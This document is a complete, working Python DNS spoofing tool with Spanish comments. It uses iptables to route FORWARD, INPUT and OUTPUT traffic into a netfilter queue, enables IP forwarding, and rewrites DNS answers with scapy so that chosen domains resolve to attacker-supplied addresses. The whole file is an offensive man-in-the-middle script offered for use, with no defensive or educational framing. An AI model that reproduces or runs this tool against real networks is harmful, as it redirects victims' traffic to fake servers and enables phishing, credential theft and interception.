#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import argparse
import sys
import os
import signal

# --- Variables Globales ---
IPTABLES_RULES = [
    "iptables -I FORWARD -j NFQUEUE --queue-num 0",
    "iptables -I INPUT -j NFQUEUE --queue-num 0",
    "iptables -I OUTPUT -j NFQUEUE --queue-num 0"
]
SPOOF_MAP = {} # Diccionario para dominios a falsificar: {"dominio.com.": "IP_falsa"}

# --- Manejo de Ctrl + C ---
def def_handler(sig, frame):
    print(f"\n[!] Ctrl+C detectado. Restaurando reglas de iptables. Por favor, espera...")
    restore_iptables()
    print(f"[+] Reglas de iptables restauradas. Saliendo.")
    sys.exit(0)

signal.signal(signal.SIGINT, def_handler)

# --- Funciones de Argumentos ---
def get_arguments():
    parser = argparse.ArgumentParser(description="Herramienta de DNS Spoofing. Intercepta y falsifica respuestas DNS.")
    parser.add_argument("-s", "--spoof", dest="spoof_entries", required=True, action='append',
                        help="Dominio a falsificar y su IP falsa. Formato: dominio.com:IP_falsa (puede usarse múltiples veces)")
    args = parser.parse_args()

    for entry in args.spoof_entries:
        if ':' in entry:
            domain, ip = entry.split(':', 1)
            if not domain.endswith('.'):
                domain += '.'
            SPOOF_MAP[domain] = ip
        else:
            print(f"[!] Formato inválido para --spoof: {entry}. Usa dominio.com:IP_falsa")
            sys.exit(1)
            
    if not SPOOF_MAP:
        print("[!] No se especificaron dominios a falsificar. Saliendo.")
        sys.exit(1)

    return args

# --- Funciones de Iptables ---
def set_iptables():
    print("[+] Aplicando reglas de iptables para redirigir el tráfico DNS...")
    for rule in IPTABLES_RULES:
        try:
            os.system(rule)
            print(f"    [+] Regla aplicada: {rule}")
        except Exception as e:
            print(f"    [!] Error al aplicar regla {rule}: {e}")
            restore_iptables()
            sys.exit(1)
    
    os.system("sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
    print("[+] IP Forwarding habilitado.")
    print("[+] Reglas de iptables aplicadas correctamente.")

def restore_iptables():
    print("[+] Restaurando reglas de iptables...")
    for rule in reversed(IPTABLES_RULES):
        delete_rule = rule.replace("-I", "-D")
        try:
            os.system(delete_rule)
            print(f"    [+] Regla eliminada: {delete_rule}")
        except Exception as e:
            print(f"    [!] Error al eliminar regla {delete_rule}: {e}")
    print("[+] Reglas de iptables restauradas.")

# --- Lógica de Procesamiento de Paquetes ---
def process_packet(packet):
    try:
        scapy_packet = scapy.IP(packet.get_payload())

        if scapy_packet.haslayer(scapy.DNSRR):
            qname = scapy_packet[scapy.DNS].qd.qname

            if qname in SPOOF_MAP:
                print(f"[+] Interceptando petición DNS para: {qname.decode()} -> Redirigiendo a {SPOOF_MAP[qname]}")
                
                spoofed_answer = scapy.DNSRR(rrname=qname, rdata=SPOOF_MAP[qname], ttl=600)
                
                scapy_packet[scapy.DNS].an = spoofed_answer
                scapy_packet[scapy.DNS].ancount = 1
                
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].len
                del scapy_packet[scapy.UDP].chksum

                packet.set_payload(bytes(scapy_packet))
                packet.accept()
                
            else:
                packet.accept()

        elif scapy_packet.haslayer(scapy.DNS):
            packet.accept()

        else:
            packet.accept()

    except Exception as e:
        print(f"[!] Error procesando el paquete: {e}")
        packet.accept()

# --- Función Principal ---
def main():
    get_arguments()
    set_iptables()

    print(f"[+] Iniciando DNS Spoofing para los siguientes dominios:")
    for domain, ip in SPOOF_MAP.items():
        print(f"    - {domain.rstrip('.')}: {ip}")
    print("[+] Presiona Ctrl+C para detener y restaurar las reglas de iptables.")

    queue = netfilterqueue.NetfilterQueue()
    try:
        queue.bind(0, process_packet)
        queue.run()
    except PermissionError:
        print("[!] Error de permisos. Necesitas ejecutar el script como root (sudo).")
        restore_iptables()
    except Exception as e:
        print(f"[!] Ocurrió un error inesperado en el DNS Spoofing: {e}")
    finally:
        queue.unbind()
        restore_iptables()

if __name__ == '__main__':
    main()